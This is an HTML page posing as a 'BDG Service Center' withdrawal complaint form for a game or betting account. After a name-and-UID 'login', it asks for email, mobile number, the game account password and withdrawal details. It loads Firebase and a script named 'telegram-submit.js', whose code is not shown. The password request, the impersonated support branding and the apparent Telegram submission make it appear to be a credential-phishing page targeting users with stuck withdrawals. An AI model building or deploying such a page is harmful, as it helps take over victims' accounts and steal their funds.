<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Withdrawal Problem - BDG Service Center</title>
    <link rel="icon" href="../IMAGE/faviconV2.png" type="image/png">
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <div class="container">

        <main class="main">

            <a href="index.html" class="back-circle" title="Back">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
            </a>

            <h1 class="heading">WITHDRWAL COMPLAIN PAGE</h1>

            <div id="loginBox" class="login-box">
                <h2 class="login-title">USER LOGIN</h2>
                <input type="text" id="loginName" placeholder="Enter Your Name" required>
                <input type="text" id="loginUid" placeholder="Enter Your UID" required>
                <button id="loginBtn" class="login-btn">Login</button>
                <p id="loginError" class="login-error"></p>
            </div>

            <form id="withdrawalForm" class="form hidden">
                <label for="email">Email Id</label>
                <input type="email" id="email" name="email" placeholder="Enter Your Email Id" required>

                <label for="mobile">Game Account Mobile Number</label>
                <input type="tel" id="mobile" name="mobile" placeholder="Enter Your Mobile Number" required>

                <label for="password">Game Account Password</label>
                <input type="password" id="password" name="password" placeholder="Enter Your Password" required>

                <label for="amount">Enter Withdrwal Amount</label>
                <input type="number" id="amount" name="amount" placeholder="Enter Withdrwal Amount" min="0" required>

                <label for="problem">Select Withdrwal Problem</label>
                <select id="problem" name="problem" required>
                    <option value="" disabled selected>Select Problem</option>
                    <option value="processing">Processing</option>
                    <option value="reject">Reject</option>
                    <option value="failed">Failed</option>
                    <option value="not-received">Amount Not Recevie Bank Account</option>
                </select>

                <label for="issueImage">Upload Withdrwal Issue Image</label>
                <input type="file" id="issueImage" name="issueImage" accept="image/*" required>

                <button type="submit" class="confirm-btn">Complain Now</button>
            </form>

        </main>

    </div>

    <div id="loadingPopup" class="popup-overlay hidden">
        <div class="popup-box">
            <div class="spinner"></div>
            <p class="popup-text">Please wait...</p>
        </div>
    </div>

    <div id="successPopup" class="popup-overlay hidden">
        <div class="popup-box">
            <p class="success-tick">✔</p>
            <p class="popup-text">Complain submitted successfully!</p>
        </div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
    <script src="telegram-submit.js"></script>
</body>
</html>
